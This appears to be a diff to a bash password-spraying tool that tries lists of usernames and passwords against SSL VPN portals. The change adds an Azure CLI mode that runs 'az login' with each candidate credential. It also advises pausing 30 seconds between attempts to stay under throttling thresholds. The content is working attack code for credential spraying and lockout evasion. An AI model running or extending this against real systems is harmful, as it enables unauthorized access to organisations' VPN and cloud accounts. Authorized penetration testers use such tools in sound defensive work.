@@ -18,6 +18,9 @@ display_usage() {
 	echo -e " apt-get install openfortivpn"
 	echo -e "    https://github.com/adrienverge/openfortivpn\n"
 
+	echo -e "\nOptional addon for Azure CLI"
+	echo -e " apt-get install azure-cli\n"
+
 	echo -e "-h, --help\t\tDisplay help text"
 	echo -e "-f\t\t\tSet username file"
 	echo -e "-p\t\t\tSet password to spray; consider using included password file; replace <COMPANYNAME> where appropriate"
@@ -33,7 +36,8 @@ display_usage() {
 	echo -e "\tpulse\t\tPulse Connect Secure SSL VPN"
 	echo -e "\tne\t\tSonicWall NetExtender SSL VPN"
 	echo -e "\tfn\t\tFortinet SSL VPN"
-	echo -e "\n-t\t\t\tSet sleep time between sprays (basic sleep commands; 5 = 5 seconds; Fortinet should sleep for minimum of 30 seconds to avoid throttling threshold)"
+	echo -e "\taz\t\tAzure CLI"
+	echo -e "\n-t\t\t\tSet sleep time between sprays (basic sleep commands; 5 = 5 seconds; Fortinet/Azure-CLI should sleep for minimum of 30 seconds to avoid throttling threshold)"
 	echo -e "-c\t\t\tpin-sha256 hash from server; argument shaped like: -c pin-sha256:<cert> (not required for ne)"
 	echo -e "\t\t\t\tValue obtained from \`openconnect <server> --servercert=1234\`\n"
 	echo -e "-r\t\t\tSet password as username: true. Default: false"
@@ -103,6 +107,9 @@ then
 		elif [ "$protocol" == "fn" ];
 				then
 					openfortivpn $server -u $i -p $i
+		elif [ "$protocol" == "az" ];
+				then
+					az login -u $i -p $i
 		else
 			echo $i | sudo openconnect $server --user=$i --passwd-on-stdin --protocol=$protocol --authenticate --servercert $cert $authgroup
 		fi
@@ -129,7 +136,9 @@ else
 				elif [ "$protocol" == "fn" ];
 				then
 					openfortivpn $server -u $i -p $j 
-
+				elif [ "$protocol" == "az" ];
+				then
+					az login -u $i -p $j
 				else
 					echo $j | sudo openconnect $server --user=$i --passwd-on-stdin --protocol=$protocol --authenticate --servercert $cert $authgroup
 				fi
@@ -153,7 +162,10 @@ else
 				yes Y | netExtender -u $i -p $password -d $domain $server
 			elif [ "$protocol" == "fn" ];
 				then
-					openfortivpn $server -u $i -p $password 
+					openfortivpn $server -u $i -p $password
+			elif [ "$protocol" == "az" ];
+				then
+					az login -u $i -p $password
 			else
 				echo $password | sudo openconnect $server --user=$i --passwd-on-stdin --protocol=$protocol --authenticate --servercert $cert $authgroup
 			fi
